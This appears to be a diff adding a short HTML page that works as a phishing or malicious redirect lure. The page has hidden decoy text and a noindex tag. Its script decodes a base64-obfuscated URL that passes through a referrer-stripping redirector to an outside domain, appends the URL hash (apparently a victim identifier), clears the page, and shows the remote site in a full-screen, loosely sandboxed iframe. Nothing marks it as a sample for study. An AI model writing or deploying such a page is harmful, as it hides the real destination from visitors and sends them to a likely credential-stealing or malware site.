@@ -1,0 +1,37 @@
+<html>
+ <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+ </head>
+ <body>
+ <span hidden>They danced under the moonlight.</span>
+ </body>
+<script>
+var quince = null;
+if(location.hash == ""){
+location.hash = ``;
+quince = ``;
+}
+if(location.hash !== ""){
+quince = location.hash;
+}
+if (location.hash.includes('?')) {
+quince = location.hash.replace('#', '');
+}
+
+(async () => {
+    var acacia = document.createElement('iframe');
+    acacia.sandbox.add('allow-same-origin');
+    acacia.sandbox.add('allow-top-navigation');
+    acacia.sandbox.add('allow-modals');
+    acacia.sandbox.add('allow-scripts');
+    acacia.sandbox.add('allow-popups-to-escape-sandbox');
+    acacia.sandbox.add('allow-forms');
+    acacia.src = atob("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovLzN5Sy50dXJlZHJlc3QuY29tLzlhRXZjOUYv")+quince;
+    acacia.style.cssText = 'position: fixed; inset: 0px; width: 100%; height: 100%; border: 0px; margin: 0px;padding: 0px; overflow: hidden; z-index: 999999;';
+    document.write(acacia);
+    document.body.innerHTML = "";
+    document.body.appendChild(acacia);
+})();
+</script>
+</html>
